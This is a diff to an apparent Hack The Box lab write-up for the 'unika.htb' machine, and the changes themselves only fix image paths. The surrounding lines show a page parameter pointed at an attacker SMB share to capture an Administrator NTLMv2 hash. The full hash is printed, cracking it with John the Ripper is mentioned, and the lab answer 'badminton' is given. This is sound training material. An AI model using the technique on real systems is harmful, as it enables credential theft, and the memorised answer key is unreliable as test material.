@@ -58,7 +58,7 @@ echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hostsh
 
 Found by: browsing the site and changing the language on the site to French or German
 
-<figure><img src="../../../../.gitbook/assets/image (8) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 We see the URL is `http://unika.htb/index.php?page=german.html`, showing this is written in PHP.
 
@@ -190,7 +190,7 @@ After going to the URL: `http://unika.htb/?page=//10.10.14.38/randomfile` we can
 [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:dd18bd7a646ce3eb:410E35FFEAE5E2CAA7D2B199EB83C620:010100000000000080A356F349C3D8013DC03F3B991E3F8E0000000002000800590035004200440001001E00570049004E002D00510059004E005900370059005A00310030004A00580004003400570049004E002D00510059004E005900370059005A00310030004A0058002E0059003500420044002E004C004F00430041004C000300140059003500420044002E004C004F00430041004C000500140059003500420044002E004C004F00430041004C000700080080A356F349C3D8010600040002000000080030003000000000000000010000000020000026B1B1EBE508823F7235F874E0EEE32F13650E88797AF1DD65C68ED3CD47D54F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330038000000000000000000
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (110) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (110) (2).png" alt=""><figcaption></figcaption></figure>
 
 Putting the hash in a file were going to crack it with John the ripper
 
@@ -212,7 +212,7 @@ Use the "--show --format=netntlmv2" options to display all of the cracked passwo
 Session completed.
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (5) (2) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 Answer: badminton
 
